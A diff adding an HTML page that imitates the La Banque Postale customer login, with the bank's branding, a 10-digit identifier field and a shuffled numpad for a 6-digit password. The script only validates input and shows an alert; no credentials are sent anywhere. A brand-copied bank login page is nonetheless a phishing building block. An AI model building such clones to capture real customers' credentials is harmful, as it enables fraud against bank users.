@@ -1,0 +1,325 @@
+<html><head><title>La Banque Postale - Connexion</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f5f5f5;
+    margin: 0;
+    padding: 0;
+}
+
+.container {
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+    min-height: 100vh;
+}
+
+.login-form {
+    width: 100%;
+    max-width: 400px;
+    background: white;
+    padding: 20px;
+    box-sizing: border-box;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    margin: 0 auto;
+}
+
+.logo {
+    width: 150px;
+    margin-bottom: 20px;
+}
+
+.right-section {
+    width: 100%;
+    background: #0046c0;
+    padding: 20px;
+    color: white;
+    box-sizing: border-box;
+}
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    color: #666;
+    font-size: 14px;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 12px 8px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    box-sizing: border-box;
+    font-size: 16px;
+}
+
+.hidden {
+    display: none;
+}
+
+.numpad {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 8px;
+    margin: 15px 0;
+}
+
+.numpad button {
+    padding: 15px 10px;
+    border: none;
+    background: white;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    font-size: 16px;
+}
+
+.numpad button:hover {
+    background-color: #f0f0f0;
+}
+
+.password-dots {
+    display: flex;
+    gap: 8px;
+    margin: 15px 0;
+    justify-content: center;
+}
+
+.dot {
+    width: 12px;
+    height: 12px;
+    border: 1px solid #999;
+    border-radius: 50%;
+    transition: background-color 0.2s;
+}
+
+.dot.filled {
+    background-color: #0046c0;
+}
+
+.button {
+    width: 100%;
+    padding: 15px;
+    background: #0046c0;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    margin-bottom: 15px;
+    font-size: 16px;
+}
+
+.button:hover {
+    background: #003590;
+}
+
+.info-box, .insurance-box {
+    background: rgba(255,255,255,0.1);
+    padding: 15px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+}
+
+.insurance-button {
+    background: rgba(255,255,255,0.2);
+    border: none;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    width: 100%;
+    margin-top: 10px;
+}
+
+.insurance-button:hover {
+    background: rgba(255,255,255,0.3);
+}
+
+.error-message {
+    color: #ff0000;
+    font-size: 14px;
+    margin-top: 5px;
+    display: none;
+}
+
+@media (min-width: 768px) {
+    .container {
+        flex-direction: row;
+    }
+    
+    .login-form {
+        width: 400px;
+        margin: 0;
+    }
+    
+    .right-section {
+        padding: 40px;
+    }
+    
+    .insurance-button {
+        width: auto;
+    }
+}
+
+@media (max-width: 360px) {
+    .numpad {
+        grid-template-columns: repeat(3, 1fr);
+    }
+    
+    .logo {
+        width: 120px;
+    }
+    
+    h3 {
+        font-size: 16px;
+    }
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="login-form">
+        <svg class="logo" viewBox="0 0 200 50">
+            <path d="M10,25 h30 v-10 h20" stroke="#0046c0" fill="none" stroke-width="3"/>
+            <text x="70" y="30" fill="#0046c0" font-size="16">La Banque Postale</text>
+        </svg>
+        
+        <h3>Connexion à votre compte particulier</h3>
+        
+        <div class="form-group">
+            <label>Identifiant (10 chiffres)</label>
+            <input type="text" id="identifier" maxlength="10" pattern="\d{10}" />
+            <div class="error-message" id="identifier-error">L'identifiant doit contenir 10 chiffres</div>
+            <button class="button" id="continue-button">Continuer</button>
+        </div>
+
+        <div class="form-group hidden" id="password-section">
+            <label>Mot de passe (6 chiffres)</label>
+            <div class="password-dots" id="password-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <input type="hidden" id="password-input" maxlength="6" />
+            <div class="error-message" id="password-error">Le mot de passe doit contenir 6 chiffres</div>
+            
+            <div class="numpad" id="numpad"></div>
+            
+            <button class="button" id="connect-button">Se connecter</button>
+        </div>
+        
+        <p><a href="https://www.labanquepostale.fr/particulier/forgot-password">Identifiant / Mot de passe oublié</a></p>
+    </div>
+    
+    <div class="right-section">
+        <h1>La Banque Postale, citoyenne</h1>
+        
+        <div class="info-box">
+            <h3>Votre page de connexion évolue !</h3>
+            <p>La sécurité de votre page de connexion se modernise ! Pour accéder à vos comptes : saisissez vos identifiant et mot de passe habituels.</p>
+            <p>Avant de vous connecter, vérifiez que vous êtes bien sur l'adresse de connexion suivante :<br>
+            <a href="https://www.labanquepostale.fr/particulier/connexion-espace-client.html" style="color: white;">https://www.labanquepostale.fr/particulier/connexion-espace-client.html</a></p>
+        </div>
+        
+        <div class="insurance-box">
+            <h3>Espace Assurance La Banque Postale</h3>
+            <p>Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?</p>
+            <button class="insurance-button">Me connecter à mon espace assurance</button>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const numpad = document.getElementById('numpad');
+    const passwordInput = document.getElementById('password-input');
+    const passwordDots = document.getElementById('password-dots').children;
+    const identifierInput = document.getElementById('identifier');
+    const connectButton = document.getElementById('connect-button');
+    const continueButton = document.getElementById('continue-button');
+    const passwordSection = document.getElementById('password-section');
+    const identifierError = document.getElementById('identifier-error');
+    const passwordError = document.getElementById('password-error');
+    
+    const numbers = [0,1,2,3,4,5,6,7,8,9];
+    for (let i = numbers.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [numbers[i], numbers[j]] = [numbers[j], numbers[i]];
+    }
+    
+    numbers.forEach(num => {
+        const button = document.createElement('button');
+        button.textContent = num;
+        button.addEventListener('click', () => addPasswordDigit(num));
+        numpad.appendChild(button);
+    });
+    
+    continueButton.addEventListener('click', function() {
+        if (/^\d{10}$/.test(identifierInput.value)) {
+            identifierError.style.display = 'none';
+            passwordSection.classList.remove('hidden');
+            continueButton.classList.add('hidden');
+        } else {
+            identifierError.style.display = 'block';
+        }
+    });
+    
+    function addPasswordDigit(digit) {
+        if (passwordInput.value.length < 6) {
+            passwordInput.value += digit;
+            updatePasswordDots();
+        }
+    }
+    
+    function updatePasswordDots() {
+        const length = passwordInput.value.length;
+        for (let i = 0; i < passwordDots.length; i++) {
+            passwordDots[i].classList.toggle('filled', i < length);
+        }
+    }
+    
+    connectButton.addEventListener('click', function() {
+        let isValid = true;
+        
+        if (!/^\d{10}$/.test(identifierInput.value)) {
+            identifierError.style.display = 'block';
+            isValid = false;
+        } else {
+            identifierError.style.display = 'none';
+        }
+        
+        if (passwordInput.value.length !== 6) {
+            passwordError.style.display = 'block';
+            isValid = false;
+        } else {
+            passwordError.style.display = 'none';
+        }
+        
+        if (isValid) {
+            alert('Connexion en cours...');
+        }
+    });
+    
+    document.addEventListener('click', function(e) {
+        if (!e.target.closest('.numpad') && !e.target.closest('.connect-button')) {
+            passwordInput.value = '';
+            updatePasswordDots();
+        }
+    });
+    
+    identifierInput.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '');
+    });
+});
+</script>
+</body></html>
